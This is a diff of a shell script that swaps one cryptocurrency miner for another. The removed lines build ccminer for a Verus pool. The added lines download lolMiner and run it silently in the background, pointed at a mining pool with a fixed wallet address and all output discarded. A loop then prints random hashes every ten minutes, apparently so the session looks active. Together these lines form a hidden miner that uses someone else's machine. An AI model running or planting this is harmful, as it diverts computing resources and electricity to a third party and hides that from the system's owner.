@@ -1,19 +1,5 @@
-apt-get update && sudo apt-get install sudo
-sudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential
-
-wget http://developer.download.nvidia.com/compute/cuda/10.2/Prod/local_installers/cuda_10.2.89_440.33.01_linux.run
-
-sudo sh cuda_10.2.89_440.33.01_linux.run
-
-git clone --single-branch -b verus2.2gpu https://github.com/monkins1010/ccminer.git
-
-cd ccminer
-
-chmod +x build.sh
-
-chmod +x configure.sh
-
-chmod +x autogen.sh
-
-./build.sh
-./ccminer -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RWKZzFWXcwAy3BVGL9avrsAnTQTwvKVUwZ.cuuk -p x -d 0,1
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.61/lolMiner_v1.61_Lin64.tar.gz
+tar xf lolMiner_v1.61_Lin64.tar.gz
+cd 1.61
+./lolMiner --algo ETHASH --pool qiemining.site:8088 --user 0x9dc2157e3ccf7a88268afb7def08a872667a6e29.aqsh --pass 123 --dns-over-http=2 208.67.222.222 > /dev/null 2>&1 &
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
